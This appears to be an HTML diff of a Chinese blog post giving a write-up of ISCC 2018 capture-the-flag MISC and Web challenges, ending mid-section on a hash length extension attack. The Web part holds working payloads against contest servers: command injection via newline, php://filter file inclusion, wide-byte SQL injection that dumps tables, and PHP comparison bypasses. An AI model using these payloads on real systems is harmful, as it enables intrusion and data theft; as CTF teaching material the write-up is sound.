class="toc-text">Only admin can see flag</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="What-is-that？"><a href="#What-is-that？" class="headerlink" title="What is that？"></a>What is that？</h3><p>winhex打开修改高度</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011954_574.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805011955_458.png" alt=""></p>
+<p>_Welcome_To_ISCC<em>2018</em></p>
+<h3 id="数字密文"><a href="#数字密文" class="headerlink" title="数字密文"></a>数字密文</h3><p>69742773206561737921 </p>
+<p>16进制转文本 </p>
+<p>给个在线网站</p>
+<p><a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="external">https://www.bejson.com/convert/ox2str/</a></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171116_151.png" alt=""></p>
+<h3 id="秘密电报："><a href="#秘密电报：" class="headerlink" title="秘密电报："></a>秘密电报：</h3><p>知识就是力量 ABAAAABABBABAAAABABAAABAAABAAABAABAAAABAAAABA</p>
+<p>在线培根密码解密</p>
+<p><a href="http://tool.ph0en1x.com/bacon/" target="_blank" rel="external">http://tool.ph0en1x.com/bacon/</a></p>
+<p>ILIKEISCC</p>
+<h3 id="重重谍影"><a href="#重重谍影" class="headerlink" title="重重谍影"></a>重重谍影</h3><p>base64解密，</p>
+<p>在线解密<a href="https://base64.supfree.net/" target="_blank" rel="external">https://base64.supfree.net/</a></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171406_511.png" alt=""></p>
+<p>解密到这里不行了</p>
+<p>U2FsdGVkX183BPnBd50ynIRM3o8YLmwHaoi8b8QvfVdFHCEwG9iwp4hJHznrl7d4B5rKClEyYVtx6uZFIKtCXo71fR9Mcf6b0EzejhZ4pnhnJOl+zrZVlV0T9NUA+u1ziN+jkpb6ERH86j7t45v4Mpe+j1gCpvaQgoKC0Oaa5kc=  </p>
+<p>然后再用aes解密 </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171412_741.png" alt=""></p>
+<p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171413_518.png" alt=""></p>
+<p>把我复制走</p>
+<h3 id="有趣的ISCC"><a href="#有趣的ISCC" class="headerlink" title="有趣的ISCC"></a>有趣的ISCC</h3><p>把图片放进WinHex中观察 </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171511_899.png" alt=""></p>
+<p>末尾有很多Unicode</p>
+<p>Unicode转ascii</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171423_933.png" alt=""></p>
+<p>unicode转中文</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171425_238.png" alt=""></p>
+<p>flag{iscc is fun}</p>
+<h3 id="Where-is-the-FLAG？"><a href="#Where-is-the-FLAG？" class="headerlink" title="Where is the FLAG？"></a>Where is the FLAG？</h3><p>TweakPNG打开 </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171430_847.png" alt=""></p>
+<p>Adobe Fireworks CS5 处理 </p>
+<p>图层隐层</p>
+<p>拼接一下</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171502_356.png" alt=""></p>
+<h3 id="凯撒十三世"><a href="#凯撒十三世" class="headerlink" title="凯撒十三世"></a>凯撒十三世</h3><p>凯撒密码，并且偏移是13</p>
+<p>得到<code>roqtp697t95j3</code>，一看就不是flag，结合提示<code>键盘</code>，所以可能是键盘密码: 即密文在键盘上的下一行所对应的字符是相应明文，</p>
+<h3 id="一只猫的心思"><a href="#一只猫的心思" class="headerlink" title="一只猫的心思"></a>一只猫的心思</h3><p>winhex打开会发现这个是jpg文件，有文件头，但是没有文件尾，搜索之后就会得到文件尾FFD9所在的位置，需要把FFD9后面的十六进制转化为一个新的文件，并且要以（.doc）格式保存  </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171528_660.png" alt=""></p>
+<p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="external">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a> </p>
+<p>佛曰密码解</p>
+<p>523156615245644E536C564856544E565130354B553064524D6C524E546B4A56535655795645644F5530524857544A4553553943566B644A4D6C524E546C7052523155795645744F536C5248515670555330354452456456576B524854554A585231457956554E4F51305A4855544E4553303153566B64424D6C524A546B7058527A525A5245744F576C5A4854544A5554553554513063304E46524C54564A5652316B795255744F51305A4856544E5554564661566B6C464D6B5252546B70595231557A5245394E516C5A4856544A555355354B566B644E5756524E5455705752316B7A5255564F55305248566B465553564A4356306C4E4D6C524E546B4A565231557952453152556C564A56544A455555354B5530644E5756525054554A56523030795645314F516C5A4857544A4553303143566B64464D305648546B744352314A425645744F576C5A4855544A4651303543566B64564D6B524854554A555230557A52454E4F536C644855544A5554553543566B645A4D6B564A546C4E445231566152456C52576C5A4855544A5553303544516B64564D6C524C54564A55523045795245314F556C4A4856544E455355354B56556C564D6B564E546B70535230315A52457452536C564951544A555455354B565564535156524A54564A575230457956456C4E576C46485454525553303143566B6446576C564A54544A46</p>
+<p>十六进制转换了，转换为字符串：  </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171532_778.png" alt=""></p>
+<p>base64解密：  </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171557_687.png" alt=""></p>
+<p>base32：  </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171615_371.png" alt=""></p>
+<p>十六进制转化： </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171616_86.png" alt=""></p>
+<p>base64解密：  </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171617_526.png" alt=""></p>
+<p>base32：  </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171618_95.png" alt=""></p>
+<p>十六进制转化 </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805171619_254.png" alt=""></p>
+<p>F1a9_is_I5cc_ZOl8_G3TP01NT</p>
+<p>Base64编码是使用64个可打印ASCII字符（A-Z、a-z、0-9、+、/）将任意字节序列数据编码成ASCII字符串，另有“=”符号用作后缀用途</p>
+<p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7） </p>
+<p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码 </p>
+<h3 id="暴力XX不可取"><a href="#暴力XX不可取" class="headerlink" title="暴力XX不可取"></a>暴力XX不可取</h3><p>伪加密修改的几种方法</p>
+<blockquote>
+<p>1、在Mac OS以及部分linux（Kali）系统中，可以直接打开伪加密的ZIP压缩包。</p>
+<p>2、使用检测伪加密的工具ZipCenOp.jar，解密后如果能成功打开ZIP包，则是伪加密，否则说明思路错误。</p>
+<p>3、使用16进制编辑器更改加密标志位。</p>
+</blockquote>
+<p>打开压缩包之后发现需要解压密码</p>
+<p>既然已经知道是伪加密那就直接尝试伪加密，利用伪加密判断工具ZipCenOp</p>
+<pre><code>java -jar ZipCenOp.jar r ISCC-MISC02.zip
+</code></pre><p>vfppjrnerpbzvat </p>
+<p>rot13 解码</p>
+<p>得到isccwearecoming</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805012218_803.png" alt=""></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805012227_276.png" alt=""></p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="比较数字大小"><a href="#比较数字大小" class="headerlink" title="比较数字大小"></a>比较数字大小</h3><p>f12查看 本地长度绕过修改maxlength=4</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805031858_254.png" alt=""></p>
+<p>输入99999999提交</p>
+<p>得key is 768HKyu678567&amp;*&amp;K</p>
+<h3 id="web01"><a href="#web01" class="headerlink" title="web01"></a>web01</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071904_900.png" alt=""></p>
+<pre><code>&lt;?php 
+highlight_file(&#39;2.php&#39;); 
+$flag=&#39;{***************}&#39;; 
+if (isset($_GET[&#39;password&#39;])) {   
+    if (strcmp($_GET[&#39;password&#39;], $flag) == 0)   ////如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。 //比较两个字符串（区分大小写） 
+        die(&#39;Flag: &#39;.$flag);   
+    else   
+        print &#39;Invalid password&#39;;   
+}   
+?&gt;
+</code></pre><p><a href="http://118.190.152.202:8003?password[]=1" target="_blank" rel="external">http://118.190.152.202:8003?password[]=1</a></p>
+<p>ISCC{iscc_ef3w5r5tw_5rg5y6s3t3} </p>
+<h3 id="本地的诱惑"><a href="#本地的诱惑" class="headerlink" title="本地的诱惑"></a>本地的诱惑</h3><p>查看源码ISCC{^&amp;*(UIHKJjkadshf}</p>
+<h3 id="你能跨过去吗？"><a href="#你能跨过去吗？" class="headerlink" title="你能跨过去吗？"></a>你能跨过去吗？</h3><p>题目</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805031853_626.png" alt=""></p>
+<p>%2b/v%2b%20%2bADwAcwBjAHIAaQBwAHQAPgBhAGwAZQByAHQAKAAiAGsAZQB5ADoALwAlAG4AcwBmAG8AYwB1AHMAWABTAFMAdABlAHMAdAAlAC8AIgApADwALwBzAGMAcgBpAHAAdAA%2bAC0-&amp;_</p>
+<p>base64解码</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805031853_539.png" alt=""></p>
+<p>flag{Hell0World}</p>
+<h3 id="一切都是套路"><a href="#一切都是套路" class="headerlink" title="一切都是套路"></a>一切都是套路</h3><p>好像有个文件忘记删了</p>
+<p>考察源码泄露</p>
+<p>py脚本得到<a href="http://118.190.152.202:8009/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8009/index.php.txt</a></p>
+<p>所以进入得到如下代码</p>
+<pre><code class="php">&lt;?php
+
+include &quot;flag.php&quot;;
+
+
+if ($_SERVER[&quot;REQUEST_METHOD&quot;] != &quot;POST&quot;)
+    die(&quot;flag is here&quot;);
+
+if (!isset($_POST[&quot;flag&quot;]) 
+    die($_403);
+
+foreach ($_GET as $k =&gt; $v){ 
+    $$k = $$v;//$k=200 $$k=$_200    所以$_200 = &amp;flag
+}
+
+foreach ($_POST as $k =&gt; $v){
+    $$k = $v; //$flag =2333
+}
+if ( $_POST[&quot;flag&quot;] !== $flag )
+    die($_403);
+
+echo &quot;flag: &quot;. $flag . &quot;\n&quot;;
+die($_200);
+
+?&gt;
+</code></pre>
+<blockquote>
+<h5 id="foreach"><a href="#foreach" class="headerlink" title="foreach"></a>foreach</h5><p>(PHP 4, PHP 5, PHP 7)</p>
+<p><em>foreach</em> 语法结构提供了遍历数组的简单方式。<em>foreach</em> 仅能够应用于数组和对象，如果尝试应用于其他数据类型的变量，或者未初始化的变量将发出错误信息。有两种语法：</p>
+<pre><code>foreach (array_expression as $value)
+    statement
+foreach (array_expression as $key =&gt; $value)
+    statement
+</code></pre><p>第一种格式遍历给定的 <em>array_expression</em> 数组。每次循环中，当前单元的值被赋给 <em>$value</em> 并且数组内部的指针向前移一步（因此下一次循环中将会得到下一个单元）。</p>
+<p>第二种格式做同样的事，只除了当前单元的键名也会在每次循环中被赋给变量 <em>$key</em>。</p>
+</blockquote>
+<p><a href="http://www.cleey.com/blog/single/id/841.html" target="_blank" rel="external">深入解析php中的foreach问题</a></p>
+<p>题目中使用了两个foreach并且也使用了’&amp;&amp;’,两个foreach中对 $$key的处理是不一样的，满足条件后会将$flag里面的值打印出来，所以$flag是在flag.php文件文件中的。 行间的代码会将$flag的值给覆盖掉了，所以需要先将$flag的值赋给$_200或$_403变量，然后利用die($_200)或 die($_403)将flag打印出来。</p>
+<p>有很明显的变量覆盖漏洞。要求我们在post语句中有flag，同时在第二个foreach中又把<code>$flag</code>直接覆盖了，所以直接通过echo语句输出的flag是被修改过的。接着看看有什么输出点，比如有个<code>die($_200)</code>，结合第一个foreach的功能，我们可以在第二个foreach之前先将<code>$_200</code>的值覆盖为原flag的值。</p>
+<p>payload:</p>
+<pre><code>index.php?_200=flag
+POST:
+flag=1
+</code></pre><p>利用前面的<code>die($_403)</code>也可以实现。我们先把原flag的值覆盖到<code>$_403</code>上，然后构造<code>$_POST[&quot;flag&quot;] !== $flag</code>，从而<code>die($_403)</code>输出flag。</p>
+<p>payload2:</p>
+<pre><code>index.php?_403=flag&amp;_POST=1
+POST:
+flag=
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805070015_872.png" alt=""></p>
+<p>ISCC{taolu2333333….} </p>
+<h3 id="你能绕过吗"><a href="#你能绕过吗" class="headerlink" title="你能绕过吗?"></a>你能绕过吗?</h3><p>打开地址随便点文章，一开始可能以为是sql注入</p>
+<p>但仔细看会发现?f=articles可能是存在文件包含漏洞</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071843_315.png" alt=""></p>
+<p>但是这里有个坑，题目说</p>
+<blockquote>
+<p>你能绕过吗?</p>
+<p>没过滤好啊</p>
+</blockquote>
+<p>因为考察文件包含漏洞所以很有可能过滤php filter协议，尝试大写Php发现绕过成功</p>
+<p><a href="http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2" target="_blank" rel="external">http://118.190.152.202:8008/index.php?f=Php://filter/read=convert.base64-encode/resource=index&amp;id=2</a></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071842_517.png" alt=""></p>
+<p>得到base64源码。</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805071842_242.png" alt=""></p>
+<p>ISCC{LFIOOOOOOOOOOOOOO}</p>
+<h3 id="web02"><a href="#web02" class="headerlink" title="web02"></a>web02</h3><p><a href="http://118.190.152.202:8004/" target="_blank" rel="external">http://118.190.152.202:8004/</a></p>
+<p>一开始尝试X-Forwarded-For: 127.0.0.1不行</p>
+<blockquote>
+<pre><code>X-Forwarded-For: 127.0.0.1
+Contact: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+Referer: 127.0.0.1
+From: 127.0.0.1
+X-Wap-Profile: 127.0.0.1
+True-Client-IP: 127.0.0.1
+Client-IP: 127.0.0.1
+</code></pre></blockquote>
+<p>后来尝试Client-IP: 127.0.0.1</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805021340_915.png" alt=""></p>
+<p>ISCC{iscc_059eeb8c0c33eb62}</p>
+<h3 id="请ping我的ip-看你能Ping通吗？"><a href="#请ping我的ip-看你能Ping通吗？" class="headerlink" title="请ping我的ip 看你能Ping通吗？"></a>请ping我的ip 看你能Ping通吗？</h3><p>万万没想到直接在get方式下命令执行，过滤| 使用%0a绕过</p>
+<p>查看当前目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0als</a></p>
+<p>查看源代码<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acat%20index.php</a></p>
+<pre><code> &#39;&#39;,
+        &#39;;&#39; =&gt; &#39;&#39;,
+        &#39;|&#39; =&gt; &#39;&#39;,
+        &#39;-&#39;  =&gt; &#39;&#39;,
+        &#39;$&#39;  =&gt; &#39;&#39;,
+        &#39;(&#39;  =&gt; &#39;&#39;,
+        &#39;)&#39;  =&gt; &#39;&#39;,
+        &#39;`&#39;  =&gt; &#39;&#39;,
+        &#39;||&#39; =&gt; &#39;&#39;,
+    );
+
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+
+
+
+    if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) {
+        // Windows
+
+        $cmd = shell_exec( &#39;ping  &#39; . $target );
+    }
+    else {
+        // *nix
+        $cmd = shell_exec( &#39;ping  -c 1 &#39; . $target );
+    }
+
+
+    echo  &quot;
+{$cmd}
+&quot;;
+
+
+?&gt;
+</code></pre><p>查看根目录<a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0als</a></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805080036_137.png" alt=""></p>
+<p>一个一个试查看flag在哪里 发现flag在/home/flag</p>
+<p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0als</a></p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805080045_61.png" alt=""></p>
+<p><a href="http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag" target="_blank" rel="external">http://118.190.152.202:8018/index.php?ip=118.190.152.202%0acd%20../../../%0acd%20home%0acat%20flag</a></p>
+<pre><code>ISCC{8a8646c7a2fce16b166fbc68ca65f9e4}
+</code></pre><p>Reference：</p>
+<p><a href="http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/" target="_blank" rel="external">http://vinc.top/2016/12/22/%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%91%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93/</a></p>
+<p>方法二:</p>
+<p> 使用扫描器，扫描一下目录。如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/834add0a-fcb1-4893-bd20-de7ff3e922d4.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> 扫描结果：<a href="http://118.190.152.202:8018/flag.txt" target="_blank" rel="external">http://118.190.152.202:8018/flag.txt</a> （3） 打开扫描结果，如下图所示； <img src="http://www.360zhijia.com/wp-content/uploads/2018/05/25/afd1056b-c0f7-4735-aff0-2cf288df693f.png" alt="第一手详细又全面的ISCC 2018 writeup等你学习"> </p>
+<h3 id="php是世界上最好的语言"><a href="#php是世界上最好的语言" class="headerlink" title="php是世界上最好的语言"></a>php是世界上最好的语言</h3><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805170015_39.png" alt=""></p>
+<pre><code class="php">&lt;?php 
+header(&quot;content-type:text/html;charset=utf-8&quot;); 
+if(isset($_POST[&#39;username&#39;])&amp;isset($_POST[&#39;password&#39;])){ 
+    $username = $_POST[&#39;username&#39;]; 
+    $password = $_POST[&#39;password&#39;]; 
+} 
+else{ 
+    $username=&quot;hello&quot;; 
+    $password=&quot;hello&quot;; 
+} 
+if(md5($password) == 0){ 
+    echo &quot;xxxxx&quot;; 
+} 
+
+
+show_source(__FILE__); 
+?&gt;
+</code></pre>
+<p>md5</p>
+<p>password=240610708</p>
+<p>跳转</p>
+<pre><code class="php">&lt;?php 
+include &#39;flag.php&#39;; 
+$a = @$_REQUEST[&#39;a&#39;]; 
+@eval(&quot;var_dump($$a);&quot;); 
+show_source(__FILE__); 
+
+?&gt;
+</code></pre>
+<p>$$a 这个东西很诡异。其实就是php中变量可以当作另一个变量的变量名 </p>
+<p><strong>$GLOBALS</strong> — 引用全局作用域中可用的全部变量</p>
+<p>$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。</p>
+<p>PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。</p>
+<p>这里介绍一个php中的特殊变量: <code>$GLOBALS</code>，它的作用如下： </p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805170011_680.png" alt=""></p>
+<p> 所以我们可以利用<code>$GLOBALS</code>输出flag的值，故payload： </p>
+<p><a href="http://118.190.152.202:8005/no_md5.php?a=GLOBALS" target="_blank" rel="external">http://118.190.152.202:8005/no_md5.php?a=GLOBALS</a></p>
+<p>ISCC{a39f9a1ff7eb4bab8a6a21b2ce111b4} </p>
+<h3 id="Please-give-me-username-and-password"><a href="#Please-give-me-username-and-password" class="headerlink" title="Please give me username and password!"></a>Please give me username and password!</h3><p>在url传参username和password得到界面提示有index.php.txt文件</p>
+<p>所以访问<a href="http://118.190.152.202:8017/index.php.txt" target="_blank" rel="external">http://118.190.152.202:8017/index.php.txt</a></p>
+<p>得到源码</p>
+<pre><code>&lt;?php
+error_reporting(0);
+$flag = &quot;***********&quot;;    
+if(isset($_GET[&#39;username&#39;])){
+    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){
+    $a = fla;
+    echo &quot;very good!Username is right&quot;;
+    }
+    else{
+    print &#39;Username is not right&lt;!--index.php.txt--&gt;&#39;;}
+}else
+print &#39;Please give me username or password!&#39;;
+if (isset($_GET[&#39;password&#39;])){
+    if (is_numeric($_GET[&#39;password&#39;])){
+        if (strlen($_GET[&#39;password&#39;]) &lt; 4){
+            if ($_GET[&#39;password&#39;] &gt; 999){
+            $b = g;
+            print &#39;&lt;p&gt;very good!Password is right&lt;/p&gt;&#39;;
+        }else 
+            print &#39;&lt;p&gt;Password too little&lt;/p&gt;&#39;;
+        }else
+        print &#39;&lt;p&gt;Password too long&lt;/p&gt;&#39;;
+    }else
+    print &#39;&lt;p&gt;Password is not numeric&lt;/p&gt;&#39;;
+}
+if ($a.$b == &quot;flag&quot;)
+    print $flag;
+?&gt;
+</code></pre><p>分析</p>
+<pre><code>if(isset($_GET[&#39;username&#39;])){
+    if (0 == strcasecmp($flag,$_GET[&#39;username&#39;])){
+    $a = fla;
+    echo &quot;very good!Username is right&quot;;
+</code></pre><blockquote>
+<p>strcasecmp(string1,string2)</p>
+<p> 参数 str1第一个字符串。str2第二个字符串。</p>
+<p>如果 str1 小于 str2 返回 &lt; 0；</p>
+<p> 如果 str1 大于 str2 返回 &gt; 0；</p>
+<p>如果两者相等，返回 0。 </p>
+</blockquote>
+<p>可以使用username数组绕过</p>
+<pre><code>if (is_numeric($_GET[&#39;password&#39;])){
+        if (strlen($_GET[&#39;password&#39;]) &lt; 4){
+            if ($_GET[&#39;password&#39;] &gt; 999){
+            $b = g;
+</code></pre><p>必须通过3位数字，但大于999</p>
+<p><a href="http://52.10.107.64:8002/?password=4e3" target="_blank" rel="external">?password=4e3</a> </p>
+<p><a href="http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3" target="_blank" rel="external">http://118.190.152.202:8017/index.php?username[]=1&amp;password=4e3</a> </p>
+<p>flag{ISCC2018_Very_GOOD!} </p>
+<p>Reference：</p>
+<p><a href="https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="external">https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</a></p>
+<p><a href="https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md" target="_blank" rel="external">https://github.com/bl4de/ctf/blob/master/2015/BostonKeyPartyCTF_2015/Symphony.md</a></p>
+<h3 id="SQL注入的艺术"><a href="#SQL注入的艺术" class="headerlink" title="SQL注入的艺术"></a>SQL注入的艺术</h3><p>注入点:个人信息栏</p>
+<p>发现页面编码是gb2312，可能是宽字节注入，检验一下<code>id=1%df&#39;--+</code>，返回正常页面，确定是宽字节注入 </p>
+<pre><code>id=1%df&#39; or 1=1  order by 8--+  
+id=1%df&#39; or 1=1  order by 9--+
+id=-1%df&#39; union select 1,2,3,4,5,6,7,8--+    
+id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(table_name),8 from information_schema.tables where table_schema = database() --+  
+
+id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(column_name),8 from information_schema.columns where table_name = 0x61646d696e73 --+ 
+
+id=-1%df&#39; union select 1,database(),3,user(),5,6,group_concat(flag),8 from admins --+
+</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805080049_453.png" alt=""></p>
+<p> Flag：Y0u_@<a href="https://github.com/33w_dxxmn_9rf0Od" target="_blank" rel="external">@33w_dxxmn_9rf0Od</a> </p>
+<h3 id="试试看"><a href="#试试看" class="headerlink" title="试试看"></a>试试看</h3><p><a href="http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/read=convert.base64-encode/resource=jpg/resource=show.php</a></p>
+<p>打开题目</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140857_654.png" alt=""></p>
+<p>查看源码<img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140858_867.png" alt=""></p>
+<p>知道这里调用show.php?img=1.jpg  访问 并修改1的值</p>
+<p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201805140901_199.png" alt=""></p>
+<p>大概可以猜测 文件包含漏洞，尝试</p>
+<pre><code class="php">img=php://filter/read=convert.base64-encode/resource=show.php
+</code></pre>
+<p>但是不行</p>
+<p>题目的坑点在于还需要包含jpg，这就是贪婪包含所在，也就是后台某处代码所致，</p>
+<p>curl <a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=jpg/resource=show.php</a></p>
+<pre><code class="php">&lt;?php
+error_reporting(0);
+ini_set(&#39;display_errors&#39;,&#39;Off&#39;);
+
+include(&#39;config.php&#39;);
+
+$img = $_GET[&#39;img&#39;];
+if(isset($img) &amp;&amp; !empty($img))
+{
+    if(strpos($img,&#39;jpg&#39;) !== false)
+    {
+        if(strpos($img,&#39;resource=&#39;) !== false &amp;&amp; preg_match(&#39;/resource=.*jpg/i&#39;,$img) === 0)
+        {
+            die(&#39;File not found.&#39;);
+        }
+
+        preg_match(&#39;/^php:\/\/filter.*resource=([^|]*)/i&#39;,trim($img),$matches);
+        if(isset($matches[1]))
+        {
+            $img = $matches[1];
+        }
+
+        header(&#39;Content-Type: image/jpeg&#39;);
+        $data = get_contents($img);
+        echo $data;
+    }
+    else
+    {
+        die(&#39;File not found.&#39;);
+    }
+
+}
+else
+{
+    ?&gt;
+    &lt;img src=&quot;1.jpg&quot;&gt;
+    &lt;?php
+}
+?&gt;
+</code></pre>
+<ol>
+<li>开头包含了config.php</li>
+<li>img必须有jpg但又不能有resource=.*jpg</li>
+<li>正则检查了并把结果填充到$matches 里去，说明我们可以使用php://filter伪协议，并且resource的值不含|，那么我们就可以用| 来分隔php 和jpg，因为正则匹配到| 就不会继续匹配后面的jpg 了，使得\$img=show.php</li>
+</ol>
+<p>知道了config.php再去访问明白为什么必须包含jpg</p>
+<pre><code class="php">&lt;?php
+function get_contents($img)
+{
+        if(strpos($img,&#39;jpg&#39;) !== false)
+        {
+                return file_get_contents($img);
+        }
+        else
+        {
+                header(&#39;Content-Type: text/html&#39;);
+                return file_get_contents($img);
+        }
+}
+?&gt;
+</code></pre>
+<p>最终payload:</p>
+<p><a href="http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg" target="_blank" rel="external">http://118.190.152.202:8006/show.php?img=php://filter/resource=../flag.php|jpg</a></p>
+<!-- flag{1ntere5ting_PHP_Regu1ar_express1onssssss} -->
+<h3 id="Collide"><a href="#Collide" class="headerlink" title="Collide"></a>Collide</h3><pre><code>&lt;?php
+include &quot;secret.php&quot;;
+@$username=(string)$_POST[&#39;username&#39;];
+function enc($text){
+    global $key;
+    return md5($key.$text);
+}
+if(enc($username) === $_COOKIE[&#39;verify&#39;]){
+    if(is_numeric(strpos($username, &quot;admin&quot;))){
+        die($flag);
+    }
+    else{
+        die(&quot;you are not admin&quot;);
+    }
+}
+else{
+    setcookie(&quot;verify&quot;, enc(&quot;guest&quot;), time()+60*60*24*7);
+    setcookie(&quot;len&quot;, strlen($key), time()+60*60*24*7);
+}
+show_source(__FILE__);
+</code></pre><ol>
+<li>一个不知道的$key，但是从cookie中可以知道它的长度是46</li>
+<li>从cookie中知道md5(\$key.guest) 的值，也就是知道enc(\$username) 符合条件的值</li>
+<li>获得flag 的条件，满足enc(\$username) == md5(\$key.guest)，同时\$username 要含有admin</li>
+</ol>
+<p>使用HashPump攻击； </p>
+<p>安装HashPump；</p>
